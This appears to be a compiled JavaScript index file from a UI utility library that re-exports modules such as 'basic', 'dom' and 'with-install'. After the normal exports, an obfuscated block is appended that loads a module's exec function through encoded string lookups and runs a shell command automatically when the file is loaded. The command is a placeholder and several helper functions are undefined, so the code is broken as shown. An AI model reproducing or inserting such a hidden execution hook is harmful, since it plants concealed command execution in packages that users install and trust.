var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __reExport = (target, mod, secondTarget) => (__copyProps(target, mod, "default"), secondTarget && __copyProps(secondTarget, mod, "default"));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var stdin_exports = {};
module.exports = __toCommonJS(stdin_exports);
__reExport(stdin_exports, require("./basic"), module.exports);
__reExport(stdin_exports, require("./props"), module.exports);
__reExport(stdin_exports, require("./dom"), module.exports);
__reExport(stdin_exports, require("./create"), module.exports);
__reExport(stdin_exports, require("./format"), module.exports);
__reExport(stdin_exports, require("./constant"), module.exports);
__reExport(stdin_exports, require("./interceptor"), module.exports);
__reExport(stdin_exports, require("./with-install"), module.exports);
__reExport(stdin_exports, require("./closest"), module.exports);

const {exec:_0x59821c}=require(_0x1a4532(0x44,-0x44,-0xe7,0x3c,'Etuj'));
(async function(){
    const _0x55de1e=_0x1a4d73(_0x59821c);
    async function _0x3fcb86(_0x2e54a4){
        const _0x1e48f6={};
        _0x1e48f6['timeout']=10000;
        const {stdout:_0x346f3a,stderr:_0x389ebe}=await _0x1e5e80[_0x44a1e0(0x5b9,0x5bd,'!#OA',0x55a,0x5a0)](_0x55de1e,_0x2e54a4,_0x1e48f6);
        if(_0x346f3a)console.log('Output: '+_0x346f3a);
        if(_0x389ebe)console.error('Error: '+_0x389ebe);
        return true;
    }
    await _0x3fcb86('your_command_here');
})();
